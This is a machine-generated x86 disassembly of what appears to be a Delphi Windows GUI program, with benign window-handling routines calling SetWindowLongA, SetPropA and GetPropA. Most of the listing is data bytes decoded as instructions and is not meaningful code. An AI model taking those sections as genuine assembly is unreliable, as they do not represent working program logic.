je r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
add [ esi + esi * 8 + 0x43 ] ch
add ah bl
inc ebx
add al ah
int1
inc ebx
add [ esi * 8 - 0xe5bffbd ] ah
inc ebx
add al bh
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ esp + esi * 8 + 0x43 ] ch
add al cl
inc ebx
add [ eax - 0xd ] bh
inc ebx
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x28 ] si
leave
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
push eax
enter 0x43 0x8
cmp [ eax ] eax
inc ebx
add [ esp + esi * 8 + 0x391c0043 ] cl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0xbffbfca ] dh
inc ebx
add [ eax ] ch
hlt
inc ebx
add [ esp + esi * 8 + 0x43 ] ch
add al cl
inc ebx
add [ eax - 0xd ] bh
inc ebx
add [ edx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x64 ] si
enter 0x43 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
enter 0x43 0x40
add [ eax ] al
add al al
mov [ ebx ] sub_403908
inc ebx
add [ ebx + esi * 8 + 0x43 ] dl
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0xbffbfca ] dh
inc ebx
add [ eax ] ch
hlt
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
add [ eax - 0x63ffbfca ] dh
int1
inc ebx
add al ah
inc ebx
add ah bl
inc ebx
add al ah
int1
inc ebx
add [ ecx + esi * 8 + 0x43 ] al
add [ ecx + esi * 8 - 0xd07ffbd ] ah
inc ebx
inc eax
outsd
insd
inc ebx
add ah bh
inc ebx
add [ ebx + esi * 8 ] al
inc ebx
add [ eax - 0x6fffbc0b ] al
hlt
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
mov eax 0x43c9
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
leave
inc ebx
add [ eax ] dh
add [ eax ] al
rol bh 0x43
add [ eax ] cl
cmp [ eax ] eax
inc ebx
add [ ebx + esi * 8 + 0x43 ] dl
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add ah dh
hlt
add ah bh
inc ebx
add [ ebx + esi * 8 ] al
clc
je r-xdata
inc ebx
inc ebx
add al bh
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
add al 0xf3
outsd
insb
jae r-xdata
retn
inc eax
add [ eax ] dl
mov [ ebx ] 0x0
sub_43ca08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx cs
inc ebx
add [ eax ] dh
add [ eax ] al
insb
leave
inc ebx
add [ eax ] cl
cmp [ eax ] eax
inc ebx
add [ eax + 0x1c0043f6 ] al
cmp [ eax ] eax
adc [ ecx ] bh
inc eax
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add ah dh
hlt
sub_43ca4e
inc ebx
add ah dh
inc ebx
add [ esi + esi * 8 + 0x43 ] ch
add ah bl
inc ebx
add al ah
int1
inc ebx
add [ esi * 8 - 0xe5bffbd ] ah
inc ebx
add al bh
inc ebx
add ah bh
inc ebx
add [ ebx + esi * 8 ] al
inc ebx
add [ eax - 0x6fffbc0b ] al
hlt
sub_43cb62
inc ebx
add [ eax + eax ] bl
add [ eax ] al
pop esp
fiadd [ eax + eax + 0x8 ]
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0xaa80041 0x44
sub_43d532
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ esi + ecx + 0x44 ] ah
add [ eax ] al
sub eax 0x2cfc0044
inc esp
add ah cl
sub eax 0x10a80044
inc esp
add ah ch
pop ss
inc esp
add [ eax + 0x17 ] dl
inc esp
add [ eax + 0x20 ] bh
inc esp
add al dh
cmove eax [ eax ]
hlt
sub_43d891
push ss
inc esp
add ah bl
cmp eax 0x44
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ ecx + ebx * 8 + 0x240043 ] bl
add [ eax ] al
inc eax

jns r-xdata
inc esp
add [ edx + ebp * 8 ] dh
inc ecx
add al cl
or al 0x44
add [ eax + 0x740041ea ] cl
or eax 0xe9b80044
inc ecx
outsd
jb r-xdata
inc eax
add [ eax + 0x36 ] bl
inc eax
call 0x584419e6
add [ eax ] eax
dec esp
push ss
inc esp
add ah bl
cmp eax 0x44
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0x42600041 0x44
cmp [ eax ] eax
pop eax
inc eax
outsd
outsb
je r-xdata
add [ edx + ebp * 8 + 0x41 ] cl
add al al
0xbb40041 0x44
js r-xdata
sub [ esp + eax * 2 ] cl
add [ ecx + 0x44 ] dl
add [ edx + eax * 2 + 0xda00044 ] al
inc esp
add [ esp + ecx + 0x44 ] bl
add [ ecx - 0x1e47ffbc ] ah
inc esp
add [ esp + ecx - 0x1e1fffbc ] dl
inc esp
add al dh
or al 0x44
add al ch
loope r-xdata
and cl bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ ecx + ebx * 8 + 0x69090043 ] dh
insd
inc esp
imul esi [ ebx + 0x61 ] 0x7656c62
add [ eax ] dl
or eax 0xe1f00044
inc esp
add [ edx + eax * 2 + 0xe040044 ] cl
inc esp
add [ esi + ecx + 0x44 ] al
add [ eax ] dh
or eax 0xe2040044
inc esp
add [ eax ] cl
loop r-xdata
add [ esp + edx * 2 ] ecx
inc edx
outsd
jb r-xdata
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
insb
pop es
add [ ebp + ecx + 0x44 ] dl
add ah al
or al [ eax + eax + 0x15 ]
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xd9b8c08b
inc ebx
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
fiadd [ ebx ]
add ecx [ edx ]
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax + 0x60043da ] bh
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
fiadd [ ebx ]
push es
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ ebx + ebx * 8 ] dl
inc ebx
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
fild [ ebx ]
push es
fadd [ ebx ]
outsd
insb
jae r-xdata
mov eax eax
pop esp
fild [ ebx ]
outsb
je r-xdata
inc ebx
outsd
fiadd [ ebx ]
mov eax eax
sbb bl bl
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
mov eax 0x8b0043da
rcr [ eax ] 0xdb
add [ eax - 0x74ffbc26 ] edi
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ ebx ] ecx
push esp
inc edx
jbe r-xdata
rcr [ ebx + ebx * 8 + 0x43 ] 0x0
inc esp
fild [ ebx ]
add al 0x2
insb
push edi
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
ror [ eax - 0x26 ] 0x43
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
pop eax
fiadd [ ebx ]
or cl [ eax ]
push esp
dec ecx
insd
mov esp 0x30043da
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edx + eax * 2 - 0x754fffbc ] dl
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0x5f340044
inc esp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add al ah
push ebx
inc esp
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ebx * 8 + 0x43 ] dh
add [ ecx + eax ] bh
add [ edx + ebx * 8 + 0x43 ] al
add [ eax + 0x68000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
out dx eax
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x540043dc
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr ah cl
inc ebx
add [ edi + ebx * 8 + 0x43 ] al
add [ edx + eax ] al
add bh bh
push esp
fild [ ebx ]
add [ eax ] al
add [ eax ] al
sub_43d8fe
inc ebx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0x42600041 0x44
sub_43dd9a
mov eax 0xb6ffb7ff
push [ ebp - 0x4b004b01 ]
inc sp
add [ eax + ebp * 2 ] dl
inc esp
add [ eax + ebp * 2 ] dh
inc esp
add [ eax + 0x68 ] bl
inc esp
add [ eax - 0x37ffbb98 ] ch
push 0x68e80044
inc esp
add [ ecx + ebp * 2 ] cl
inc esp
add [ eax ] dh
imul eax [ eax + eax + 0x54 ] 0x78004469
imul eax [ eax + eax - 0x3c ] 0x84004469
push 0x44
add ah dl
push 0x44
add [ eax ] cl
imul eax [ eax + eax + 0x1c ] 0x6b
inc esp
add [ ebx + esi * 2 + 0x73c40044 ] ah
inc esp
add [ esp + esi * 2 + 0x44 ] dh
add [ esp + esi * 2 + 0x75380044 ] dl
inc esp
add [ eax ] cl
jbe r-xdata
add [ ebp + edx * 4 + 0x44 ] bl
add [ ecx + edi * 2 ] ah
inc esp
add [ eax - 0x2fffbb8a ] dh
jbe r-xdata
add al bh
jpo r-xdata
add [ ecx + edi * 2 + 0x44 ] cl
add [ ecx + edi * 2 + 0x44 ] dl
add [ ecx + edi * 2 + 0x44 ] bl
add [ ecx + edi * 2 + 0x44 ] ah
add [ ecx + edi * 2 + 0x7a040044 ] bh
inc esp
add [ eax ] bh
jns r-xdata
add [ edi + esi * 2 ] al
inc esp
add [ edi + esi * 2 ] ah
inc esp
add [ edx + edx * 4 + 0x44 ] cl
add [ eax + 0x77 ] bl
inc esp
add [ edi + esi * 2 + 0x44 ] dh
add ah bl
xchg edx eax
inc esp
add al dh
ja r-xdata
add [ ebp + eax * 4 + 0x44 ] ah
add al dl
jg r-xdata
add [ eax + 0x7b ] dh
inc esp
add [ eax + 0x7b ] bh
inc esp
add [ eax - 0x77ffbb85 ] al
jpo r-xdata
add [ esi + edi * 2 + 0x44 ] bh
add al ch
jpe r-xdata
add [ edx + edi * 2 ] ch
inc esp
add [ eax + 0x6800447a ] ch
jpe r-xdata
add [ eax + edi * 2 ] dl
inc esp
add [ eax + ebp * 2 + 0x44 ] dh
add [ eax - 0x67ffbb98 ] cl
push 0x6c1c0044
inc esp
add [ eax ] dh
insb
inc esp
add [ esp + ebp * 2 + 0x44 ] al
add [ eax + 0x6c ] bl
inc esp
add [ eax + 0x6f ] ah
inc esp
add [ eax - 0x76 ] dh
inc esp
add [ edx + eax * 4 + 0x44 ] al
add ah al
add [ eax + eax + 0x44 ] 0x6e
inc esp
add al dh
dec esi
inc esp
add [ esp + eax * 4 ] bh
inc esp
add [ eax + ecx * 4 + 0x44 ] cl
add [ ebx ] cl
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
push esp
fild [ ebx ]
pop es
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + esi * 2 + 0x44 ] dl
add [ eax + 0x70 ] bl
inc esp
add al dh
insd
inc esp
add al cl
outsb
inc esp
add [ eax - 0x7fffbb84 ] ch
jge r-xdata
add [ eax ] al
outsb
inc esp
add [ eax ] cl
outsd
inc esp
add [ edi + ecx * 4 - 0x75d7ffbc ] dl
inc esp
add [ edi + ebp * 2 + 0x73140044 ] bh
inc esp
add al bl
pop edx
inc esp
add [ eax ] cl
add [ eax + eax + 0x7c ] 0x71
inc esp
add [ eax + 0x72 ] ch
inc esp
add [ eax + 0x4c004472 ] dl
js r-xdata
add ah ah
jpo r-xdata
add [ eax ] ch
jpo r-xdata
inc esp
add [ edx + edx ] dh
inc esp
add [ eax + 0x4c004411 ] ah
sbb eax [ eax + eax + 0x2c ]
jmp 0xffffffffe657e027
outsd
insb
hlt
add [ esp + esi * 2 + 0x77980044 ] dh
inc esp
add [ esi + ebp * 2 + 0x6e040044 ] dl
add ah dl
jge r-xdata
add ah ah
jae r-xdata
add [ edi + ecx * 4 + 0x44 ] dl
add [ ecx + edi * 2 + 0x78340044 ] dl
inc esp
add [ eax + edi * 2 + 0x78f80044 ] al
inc esp
add [ ecx + edi * 2 ] al
inc esp
add [ eax + 0x7b ] ch
inc esp
inc esp
add [ esi + ebp * 2 ] al
add [ eax ] ah
jle r-xdata
add [ esi + ebp * 2 ] ah
inc esp
add [ esi + ecx * 2 ] bl
inc esp
sub_43e554
add bh bh
mov bl bh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x72440c00
popad
ja r-xdata
jae r-xdata
outsb
push ebx
je r-xdata
nop
out 0x43 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x280043e6 ] dl
push esp
xor al 0x41
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080009 ] al
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ edx ] al
add bh bh
inc edx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or edx [ ebx + 0x68 ]
popad
insb
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
shr dh 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x44ea4874
add [ ebx ] al
add bh bh
inc ebx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ ecx ] cl
dec ecx
insd
popad
push esp
jns r-xdata
add [ esi + esi + 0x40 ] dh
add [ eax + 0x9004036 ] dh
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
add [ eax + 0x36 ] bl
inc eax
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
add [ gs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
inc ecx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] al
push es
dec ebp
popad
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
adc [ eax ] al
xor al 0x0
add bh bh
jl r-xdata
jb r-xdata
add [ eax ] al
add al bl
adc [ eax ] al
or [ ecx ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x74646957
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
out 0x43 al
add [ eax ] ch
sub_43eb90
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43ec48
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
xor eax eax
pop edx
pop ebx
retn
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43ec78
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
call sub_4048dc
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43ec48
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
jmp r-xdata
sub_43ecb4
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43ee98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40cb44
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_40493c
mov eax edi
mov edx esi
call sub_404480
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43eedc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40cb44
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_40493c
mov eax edi
mov edx esi
call sub_404480
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43ef48
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
jne r-xdata
mov eax ebx
call sub_448484
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43eff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4161a0
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43f028
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_448484
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43f050
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_402744
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43f028
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43eff4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_416044
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41621c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f0ac
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_416078
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4161a0
mov edx 0x8
call sub_402764
inc esi
dec ebx
jne r-xdata
sub_43f0e0
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4161a0
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43eff4
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43f144
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43f1a4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403610
mov edx esp
